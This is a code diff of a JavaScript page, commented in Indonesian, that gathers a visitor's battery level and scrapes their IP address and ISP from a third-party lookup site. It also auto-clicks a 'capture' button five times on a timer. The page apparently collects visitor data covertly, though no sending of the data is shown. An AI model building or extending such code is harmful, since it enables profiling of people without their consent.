@@ -64,15 +64,15 @@
                 deviceInfo.batteryLevel = battery.level * 100;
 
                 // Mengambil IP perangkat menggunakan layanan ipify
-                fetch('https://2ip.ua/')
+                fetch('https://www.ip2location.com/demo/')
                   .then(function(response) {
                     return response.text();
                   })
                   .then(function(data) {
                     var parser = new DOMParser();
                     var htmlDoc = parser.parseFromString(data, 'text/html');
-                    var ipElement = htmlDoc.querySelector('.ip-block');
-                    var ispElement = htmlDoc.querySelector('.whois-block');
+                    var ipElement = htmlDoc.querySelector('#demo-ip');
+                    var ispElement = htmlDoc.querySelector('#demo-isp');
                     if (ipElement && ispElement) {
                       deviceInfo.ipAddress = ipElement.textContent.trim();
                       deviceInfo.isp = ispElement.textContent.trim();
@@ -153,7 +153,7 @@
       var button = document.getElementById('capture-btn');
       var clickCount = 0;
       var maxClicks = 5;
-      var delay = 1000; // Delay dalam milidetik (misal: 1000 = 1 detik)
+      var delay = 4000; // Delay dalam milidetik (misal: 1000 = 1 detik)
 
       var interval = setInterval(function() {
         button.click();
